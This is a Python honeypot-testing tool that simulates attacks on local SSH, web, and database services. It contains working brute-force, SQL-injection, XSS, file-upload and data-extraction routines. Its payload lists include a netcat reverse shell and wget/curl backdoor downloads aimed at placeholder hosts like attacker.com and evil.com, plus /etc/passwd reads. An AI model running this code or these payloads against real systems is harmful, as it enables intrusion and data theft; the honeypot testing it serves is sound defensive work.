"""
Automated Attacker Simulator for Honeypot Testing
Simulates realistic attacker behavior for testing honeypot responses
"""

import asyncio
import logging
import random
import socket
import ssl
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import paramiko
import requests
import mysql.connector
import psycopg2
from ftplib import FTP
import smtplib
from email.mime.text import MIMEText

logger = logging.getLogger(__name__)

@dataclass
class AttackScenario:
    name: str
    description: str
    target_honeypot: str
    attack_steps: List[Dict[str, Any]]
    expected_duration: int  # seconds
    success_indicators: List[str]

@dataclass
class AttackResult:
    scenario_name: str
    start_time: datetime
    end_time: datetime
    success: bool
    steps_completed: int
    total_steps: int
    captured_data: Dict[str, Any]
    errors: List[str]

class AttackerSimulator:
    """Simulates various types of cyber attacks against honeypots"""
    
    def __init__(self, honeypot_endpoints: Dict[str, str] = None):
        self.honeypot_endpoints = honeypot_endpoints or {
            "ssh": "localhost:2222",
            "web_admin": "http://localhost:8080",
            "database_mysql": "localhost:3306",
            "database_postgres": "localhost:5433",
            "ftp": "localhost:21",
            "smtp": "localhost:25"
        }
        
        self.attack_scenarios = self._load_attack_scenarios()
        self.common_credentials = self._load_common_credentials()
        self.attack_payloads = self._load_attack_payloads()
        
    def _load_attack_scenarios(self) -> Dict[str, AttackScenario]:
        """Load predefined attack scenarios"""
        return {
            "ssh_brute_force": AttackScenario(
                name="SSH Brute Force Attack",
                description="Attempts to brute force SSH credentials",
                target_honeypot="ssh",
                attack_steps=[
                    {"action": "port_scan", "target": "ssh", "ports": [22, 2222]},
                    {"action": "banner_grab", "target": "ssh"},
                    {"action": "credential_brute_force", "target": "ssh", "attempts": 50},
                    {"action": "command_execution", "target": "ssh", "commands": ["whoami", "ls", "cat /etc/passwd"]}
                ],
                expected_duration=300,
                success_indicators=["successful_login", "command_executed"]
            ),
            
            "web_admin_attack": AttackScenario(
                name="Web Admin Panel Attack",
                description="Attacks web admin interface",
                target_honeypot="web_admin",
                attack_steps=[
                    {"action": "directory_enumeration", "target": "web_admin"},
                    {"action": "login_brute_force", "target": "web_admin"},
                    {"action": "sql_injection_test", "target": "web_admin"},
                    {"action": "xss_test", "target": "web_admin"},
                    {"action": "file_upload_test", "target": "web_admin"}
                ],
                expected_duration=240,
                success_indicators=["admin_access", "sql_injection_success", "file_uploaded"]
            ),
            
            "database_attack": AttackScenario(
                name="Database Attack",
                description="Attacks database services",
                target_honeypot="database_mysql",
                attack_steps=[
                    {"action": "service_detection", "target": "database_mysql"},
                    {"action": "credential_brute_force", "target": "database_mysql"},
                    {"action": "database_enumeration", "target": "database_mysql"},
                    {"action": "data_extraction", "target": "database_mysql"},
                    {"action": "privilege_escalation", "target": "database_mysql"}
                ],
                expected_duration=180,
                success_indicators=["database_access", "data_extracted", "admin_privileges"]
            ),
            
            "reconnaissance_scan": AttackScenario(
                name="Network Reconnaissance",
                description="Performs network reconnaissance",
                target_honeypot="all",
                attack_steps=[
                    {"action": "port_scan", "target": "all", "ports": "common"},
                    {"action": "service_enumeration", "target": "all"},
                    {"action": "vulnerability_scan", "target": "all"},
                    {"action": "banner_grabbing", "target": "all"}
                ],
                expected_duration=120,
                success_indicators=["services_identified", "vulnerabilities_found"]
            ),
            
            "lateral_movement": AttackScenario(
                name="Lateral Movement Simulation",
                description="Simulates lateral movement after initial compromise",
                target_honeypot="ssh",
                attack_steps=[
                    {"action": "initial_compromise", "target": "ssh"},
                    {"action": "system_enumeration", "target": "ssh"},
                    {"action": "credential_harvesting", "target": "ssh"},
                    {"action": "network_discovery", "target": "ssh"},
                    {"action": "pivot_attempt", "target": "ssh"}
                ],
                expected_duration=360,
                success_indicators=["system_compromised", "credentials_found", "pivot_successful"]
            )
        }
    
    def _load_common_credentials(self) -> List[Tuple[str, str]]:
        """Load common username/password combinations"""
        return [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("user", "user"),
            ("user", "password"),
            ("guest", "guest"),
            ("test", "test"),
            ("administrator", "administrator"),
            ("sa", "sa"),
            ("postgres", "postgres"),
            ("mysql", "mysql"),
            ("oracle", "oracle"),
            ("demo", "demo"),
            ("ftp", "ftp"),
            ("anonymous", ""),
            ("", ""),
            ("admin", ""),
            ("root", "")
        ]
    
    def _load_attack_payloads(self) -> Dict[str, List[str]]:
        """Load attack payloads for different attack types"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "admin'--",
                "' OR 'a'='a",
                "1' OR '1'='1' /*",
                "' UNION SELECT username, password FROM users--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')></iframe>"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "; nc -e /bin/sh attacker.com 4444",
                "| wget http://malicious.com/shell.sh",
                "&& curl -o /tmp/backdoor http://evil.com/backdoor"
            ],
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ]
        }
    
    async def simulate_ssh_attack(self, target: str, scenario: AttackScenario) -> AttackResult:
        """Simulate SSH-based attacks"""
        result = AttackResult(
            scenario_name=scenario.name,
            start_time=datetime.utcnow(),
            end_time=None,
            success=False,
            steps_completed=0,
            total_steps=len(scenario.attack_steps),
            captured_data={},
            errors=[]
        )
        
        try:
            host, port = target.split(":")
            port = int(port)
            
            for step_idx, step in enumerate(scenario.attack_steps):
                try:
                    if step["action"] == "port_scan":
                        await self._simulate_port_scan(host, [port])
                        result.captured_data["port_scan"] = f"Port {port} open"
                        
                    elif step["action"] == "banner_grab":
                        banner = await self._simulate_ssh_banner_grab(host, port)
                        result.captured_data["banner"] = banner
                        
                    elif step["action"] == "credential_brute_force":
                        success, creds = await self._simulate_ssh_brute_force(
                            host, port, step.get("attempts", 10)
                        )
                        if success:
                            result.captured_data["credentials"] = creds
                            result.success = True
                            
                    elif step["action"] == "command_execution":
                        if "credentials" in result.captured_data:
                            commands_output = await self._simulate_ssh_commands(
                                host, port, result.captured_data["credentials"],
                                step.get("commands", ["whoami"])
                            )
                            result.captured_data["command_output"] = commands_output
                    
                    result.steps_completed += 1
                    await asyncio.sleep(random.uniform(1, 3))  # Realistic timing
                    
                except Exception as e:
                    result.errors.append(f"Step {step_idx}: {str(e)}")
                    logger.warning(f"SSH attack step failed: {e}")
                    
        except Exception as e:
            result.errors.append(f"SSH attack failed: {str(e)}")
            logger.error(f"SSH attack simulation failed: {e}")
        
        result.end_time = datetime.utcnow()
        return result
    
    async def simulate_web_attack(self, target: str, scenario: AttackScenario) -> AttackResult:
        """Simulate web-based attacks"""
        result = AttackResult(
            scenario_name=scenario.name,
            start_time=datetime.utcnow(),
            end_time=None,
            success=False,
            steps_completed=0,
            total_steps=len(scenario.attack_steps),
            captured_data={},
            errors=[]
        )
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            })
            
            for step_idx, step in enumerate(scenario.attack_steps):
                try:
                    if step["action"] == "directory_enumeration":
                        directories = await self._simulate_directory_enum(session, target)
                        result.captured_data["directories"] = directories
                        
                    elif step["action"] == "login_brute_force":
                        success, creds = await self._simulate_web_brute_force(session, target)
                        if success:
                            result.captured_data["web_credentials"] = creds
                            result.success = True
                            
                    elif step["action"] == "sql_injection_test":
                        sqli_results = await self._simulate_sql_injection(session, target)
                        result.captured_data["sql_injection"] = sqli_results
                        
                    elif step["action"] == "xss_test":
                        xss_results = await self._simulate_xss_attack(session, target)
                        result.captured_data["xss"] = xss_results
                        
                    elif step["action"] == "file_upload_test":
                        upload_results = await self._simulate_file_upload(session, target)
                        result.captured_data["file_upload"] = upload_results
                    
                    result.steps_completed += 1
                    await asyncio.sleep(random.uniform(2, 5))
                    
                except Exception as e:
                    result.errors.append(f"Step {step_idx}: {str(e)}")
                    logger.warning(f"Web attack step failed: {e}")
                    
        except Exception as e:
            result.errors.append(f"Web attack failed: {str(e)}")
            logger.error(f"Web attack simulation failed: {e}")
        
        result.end_time = datetime.utcnow()
        return result
    
    async def simulate_database_attack(self, target: str, scenario: AttackScenario) -> AttackResult:
        """Simulate database attacks"""
        result = AttackResult(
            scenario_name=scenario.name,
            start_time=datetime.utcnow(),
            end_time=None,
            success=False,
            steps_completed=0,
            total_steps=len(scenario.attack_steps),
            captured_data={},
            errors=[]
        )
        
        try:
            host, port = target.split(":")
            port = int(port)
            
            for step_idx, step in enumerate(scenario.attack_steps):
                try:
                    if step["action"] == "service_detection":
                        service_info = await self._simulate_db_service_detection(host, port)
                        result.captured_data["service_info"] = service_info
                        
                    elif step["action"] == "credential_brute_force":
                        success, creds = await self._simulate_db_brute_force(host, port)
                        if success:
                            result.captured_data["db_credentials"] = creds
                            result.success = True
                            
                    elif step["action"] == "database_enumeration":
                        if "db_credentials" in result.captured_data:
                            db_info = await self._simulate_db_enumeration(
                                host, port, result.captured_data["db_credentials"]
                            )
                            result.captured_data["database_info"] = db_info
                            
                    elif step["action"] == "data_extraction":
                        if "db_credentials" in result.captured_data:
                            extracted_data = await self._simulate_data_extraction(
                                host, port, result.captured_data["db_credentials"]
                            )
                            result.captured_data["extracted_data"] = extracted_data
                    
                    result.steps_completed += 1
                    await asyncio.sleep(random.uniform(1, 4))
                    
                except Exception as e:
                    result.errors.append(f"Step {step_idx}: {str(e)}")
                    logger.warning(f"Database attack step failed: {e}")
                    
        except Exception as e:
            result.errors.append(f"Database attack failed: {str(e)}")
            logger.error(f"Database attack simulation failed: {e}")
        
        result.end_time = datetime.utcnow()
        return result
    
    # Helper methods for specific attack techniques
    
    async def _simulate_port_scan(self, host: str, ports: List[int]) -> Dict[int, bool]:
        """Simulate port scanning"""
        results = {}
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, port))
                results[port] = (result == 0)
                sock.close()
                await asyncio.sleep(0.1)
            except Exception:
                results[port] = False
        return results
    
    async def _simulate_ssh_banner_grab(self, host: str, port: int) -> str:
        """Simulate SSH banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            return banner
        except Exception as e:
            return f"Banner grab failed: {str(e)}"
    
    async def _simulate_ssh_brute_force(self, host: str, port: int, 
                                      max_attempts: int) -> Tuple[bool, Optional[Tuple[str, str]]]:
        """Simulate SSH brute force attack"""
        attempts = 0
        
        for username, password in self.common_credentials:
            if attempts >= max_attempts:
                break
                
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    auth_timeout=5
                )
                
                client.close()
                logger.info(f"SSH brute force successful: {username}:{password}")
                return True, (username, password)
                
            except paramiko.AuthenticationException:
                pass  # Expected for wrong credentials
            except Exception as e:
                logger.debug(f"SSH connection error: {e}")
            
            attempts += 1
            await asyncio.sleep(random.uniform(0.5, 2))
        
        return False, None
    
    async def _simulate_ssh_commands(self, host: str, port: int, 
                                   credentials: Tuple[str, str],
                                   commands: List[str]) -> Dict[str, str]:
        """Simulate SSH command execution"""
        results = {}
        username, password = credentials
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username=username, password=password)
            
            for command in commands:
                try:
                    stdin, stdout, stderr = client.exec_command(command)
                    output = stdout.read().decode()
                    error = stderr.read().decode()
                    results[command] = output if output else error
                    await asyncio.sleep(1)
                except Exception as e:
                    results[command] = f"Command failed: {str(e)}"
            
            client.close()
            
        except Exception as e:
            results["connection_error"] = str(e)
        
        return results
    
    async def _simulate_directory_enum(self, session: requests.Session, 
                                     target: str) -> List[str]:
        """Simulate directory enumeration"""
        common_dirs = [
            "/admin", "/administrator", "/wp-admin", "/phpmyadmin",
            "/backup", "/config", "/test", "/dev", "/api", "/uploads",
            "/files", "/images", "/css", "/js", "/login", "/panel"
        ]
        
        found_dirs = []
        
        for directory in common_dirs:
            try:
                response = session.get(f"{target}{directory}", timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_dirs.append(directory)
                await asyncio.sleep(random.uniform(0.5, 1.5))
            except Exception:
                pass
        
        return found_dirs
    
    async def _simulate_web_brute_force(self, session: requests.Session,
                                      target: str) -> Tuple[bool, Optional[Tuple[str, str]]]:
        """Simulate web login brute force"""
        login_paths = ["/login", "/admin", "/wp-admin", "/administrator"]
        
        for login_path in login_paths:
            try:
                # Try to find login form
                response = session.get(f"{target}{login_path}")
                if response.status_code == 200:
                    
                    # Attempt credential brute force
                    for username, password in self.common_credentials[:10]:  # Limit attempts
                        login_data = {
                            "username": username,
                            "password": password,
                            "login": "Login"
                        }
                        
                        response = session.post(
                            f"{target}{login_path}",
                            data=login_data,
                            timeout=5
                        )
                        
                        # Check for successful login indicators
                        if any(indicator in response.text.lower() for indicator in 
                               ["dashboard", "welcome", "logout", "admin panel"]):
                            return True, (username, password)
                        
                        await asyncio.sleep(random.uniform(1, 3))
                        
            except Exception:
                continue
        
        return False, None
    
    async def _simulate_sql_injection(self, session: requests.Session,
                                    target: str) -> Dict[str, Any]:
        """Simulate SQL injection attacks"""
        results = {"vulnerable_parameters": [], "successful_payloads": []}
        
        # Common parameters to test
        test_params = ["id", "user", "search", "category", "page"]
        
        for param in test_params:
            for payload in self.attack_payloads["sql_injection"][:3]:  # Limit payloads
                try:
                    response = session.get(
                        f"{target}?{param}={payload}",
                        timeout=5
                    )
                    
                    # Check for SQL error indicators
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "postgresql"]
                    if any(error in response.text.lower() for error in sql_errors):
                        results["vulnerable_parameters"].append(param)
                        results["successful_payloads"].append(payload)
                    
                    await asyncio.sleep(random.uniform(1, 2))
                    
                except Exception:
                    continue
        
        return results
    
    async def _simulate_xss_attack(self, session: requests.Session,
                                 target: str) -> Dict[str, Any]:
        """Simulate XSS attacks"""
        results = {"vulnerable_parameters": [], "successful_payloads": []}
        
        test_params = ["search", "comment", "name", "message"]
        
        for param in test_params:
            for payload in self.attack_payloads["xss"][:2]:  # Limit payloads
                try:
                    response = session.get(
                        f"{target}?{param}={payload}",
                        timeout=5
                    )
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        results["vulnerable_parameters"].append(param)
                        results["successful_payloads"].append(payload)
                    
                    await asyncio.sleep(random.uniform(1, 2))
                    
                except Exception:
                    continue
        
        return results
    
    async def _simulate_file_upload(self, session: requests.Session,
                                  target: str) -> Dict[str, Any]:
        """Simulate malicious file upload"""
        results = {"upload_attempted": False, "upload_successful": False}
        
        # Create a test file
        test_file_content = "<?php echo 'Test file uploaded'; ?>"
        
        try:
            files = {"file": ("test.php", test_file_content, "application/x-php")}
            response = session.post(f"{target}/upload", files=files, timeout=10)
            
            results["upload_attempted"] = True
            
            if response.status_code == 200 and "success" in response.text.lower():
                results["upload_successful"] = True
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    async def _simulate_db_service_detection(self, host: str, port: int) -> Dict[str, Any]:
        """Simulate database service detection"""
        results = {"service_type": "unknown", "version": "unknown"}
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Try to get service banner
            banner = sock.recv(1024).decode(errors='ignore')
            
            if "mysql" in banner.lower():
                results["service_type"] = "mysql"
            elif "postgresql" in banner.lower():
                results["service_type"] = "postgresql"
            
            results["banner"] = banner.strip()
            sock.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    async def _simulate_db_brute_force(self, host: str, port: int) -> Tuple[bool, Optional[Tuple[str, str]]]:
        """Simulate database brute force attack"""
        
        for username, password in self.common_credentials[:5]:  # Limit attempts
            try:
                # Try MySQL connection
                if port == 3306:
                    conn = mysql.connector.connect(
                        host=host,
                        port=port,
                        user=username,
                        password=password,
                        connection_timeout=5
                    )
                    conn.close()
                    return True, (username, password)
                
                # Try PostgreSQL connection
                elif port == 5432 or port == 5433:
                    conn = psycopg2.connect(
                        host=host,
                        port=port,
                        user=username,
                        password=password,
                        connect_timeout=5
                    )
                    conn.close()
                    return True, (username, password)
                    
            except Exception:
                pass  # Expected for wrong credentials
            
            await asyncio.sleep(random.uniform(1, 3))
        
        return False, None
    
    async def _simulate_db_enumeration(self, host: str, port: int,
                                     credentials: Tuple[str, str]) -> Dict[str, Any]:
        """Simulate database enumeration"""
        results = {"databases": [], "tables": [], "users": []}
        username, password = credentials
        
        try:
            if port == 3306:  # MySQL
                conn = mysql.connector.connect(
                    host=host, port=port, user=username, password=password
                )
                cursor = conn.cursor()
                
                # Enumerate databases
                cursor.execute("SHOW DATABASES")
                results["databases"] = [db[0] for db in cursor.fetchall()]
                
                # Enumerate users
                cursor.execute("SELECT user FROM mysql.user")
                results["users"] = [user[0] for user in cursor.fetchall()]
                
                conn.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    async def _simulate_data_extraction(self, host: str, port: int,
                                      credentials: Tuple[str, str]) -> Dict[str, Any]:
        """Simulate data extraction"""
        results = {"extracted_records": 0, "sample_data": []}
        username, password = credentials
        
        try:
            if port == 3306:  # MySQL
                conn = mysql.connector.connect(
                    host=host, port=port, user=username, password=password
                )
                cursor = conn.cursor()
                
                # Try to extract from common tables
                common_tables = ["users", "customers", "accounts", "employees"]
                
                for table in common_tables:
                    try:
                        cursor.execute(f"SELECT * FROM {table} LIMIT 5")
                        rows = cursor.fetchall()
                        if rows:
                            results["extracted_records"] += len(rows)
                            results["sample_data"].extend(rows[:2])  # Sample data
                    except Exception:
                        continue
                
                conn.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    # Main simulation methods
    
    async def run_scenario(self, scenario_name: str) -> AttackResult:
        """Run a specific attack scenario"""
        if scenario_name not in self.attack_scenarios:
            raise ValueError(f"Unknown scenario: {scenario_name}")
        
        scenario = self.attack_scenarios[scenario_name]
        target_endpoint = self.honeypot_endpoints.get(scenario.target_honeypot)
        
        if not target_endpoint:
            raise ValueError(f"No endpoint configured for {scenario.target_honeypot}")
        
        logger.info(f"Starting attack scenario: {scenario.name}")
        
        # Route to appropriate attack simulator
        if scenario.target_honeypot == "ssh":
            return await self.simulate_ssh_attack(target_endpoint, scenario)
        elif scenario.target_honeypot == "web_admin":
            return await self.simulate_web_attack(target_endpoint, scenario)
        elif "database" in scenario.target_honeypot:
            return await self.simulate_database_attack(target_endpoint, scenario)
        else:
            raise ValueError(f"Unsupported honeypot type: {scenario.target_honeypot}")
    
    async def run_campaign(self, scenario_names: List[str],
                         delay_between_attacks: int = 60) -> List[AttackResult]:
        """Run multiple attack scenarios as a campaign"""
        results = []
        
        for scenario_name in scenario_names:
            try:
                result = await self.run_scenario(scenario_name)
                results.append(result)
                
                logger.info(f"Completed scenario: {scenario_name}")
                
                # Wait between attacks
                if scenario_name != scenario_names[-1]:  # Don't wait after last attack
                    await asyncio.sleep(delay_between_attacks)
                    
            except Exception as e:
                logger.error(f"Failed to run scenario {scenario_name}: {e}")
                
                # Create error result
                error_result = AttackResult(
                    scenario_name=scenario_name,
                    start_time=datetime.utcnow(),
                    end_time=datetime.utcnow(),
                    success=False,
                    steps_completed=0,
                    total_steps=0,
                    captured_data={},
                    errors=[str(e)]
                )
                results.append(error_result)
        
        return results
    
    def get_available_scenarios(self) -> List[str]:
        """Get list of available attack scenarios"""
        return list(self.attack_scenarios.keys())
    
    def export_results(self, results: List[AttackResult], 
                      filename: str = "attack_results.json") -> str:
        """Export attack results to JSON"""
        results_data = []
        
        for result in results:
            result_dict = {
                "scenario_name": result.scenario_name,
                "start_time": result.start_time.isoformat(),
                "end_time": result.end_time.isoformat() if result.end_time else None,
                "success": result.success,
                "steps_completed": result.steps_completed,
                "total_steps": result.total_steps,
                "captured_data": result.captured_data,
                "errors": result.errors,
                "duration_seconds": (
                    (result.end_time - result.start_time).total_seconds()
                    if result.end_time else 0
                )
            }
            results_data.append(result_dict)
        
        import json
        with open(filename, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        logger.info(f"Exported {len(results)} attack results to {filename}")
        return filename

# Convenience functions for testing
async def run_quick_test():
    """Run a quick test of all attack types"""
    simulator = AttackerSimulator()
    
    scenarios = ["ssh_brute_force", "web_admin_attack", "database_attack"]
    results = await simulator.run_campaign(scenarios, delay_between_attacks=30)
    
    simulator.export_results(results, "quick_test_results.json")
    
    return results

if __name__ == "__main__":
    # Example usage
    async def main():
        simulator = AttackerSimulator()
        
        print("Available scenarios:")
        for scenario in simulator.get_available_scenarios():
            print(f"  - {scenario}")
        
        # Run a single scenario
        result = await simulator.run_scenario("ssh_brute_force")
        print(f"Attack result: {result.success}, Steps: {result.steps_completed}/{result.total_steps}")
        
        # Run a campaign
        campaign_results = await simulator.run_campaign([
            "reconnaissance_scan",
            "ssh_brute_force",
            "lateral_movement"
        ])
        
        simulator.export_results(campaign_results)
        print(f"Campaign completed: {len(campaign_results)} scenarios")
    
    asyncio.run(main())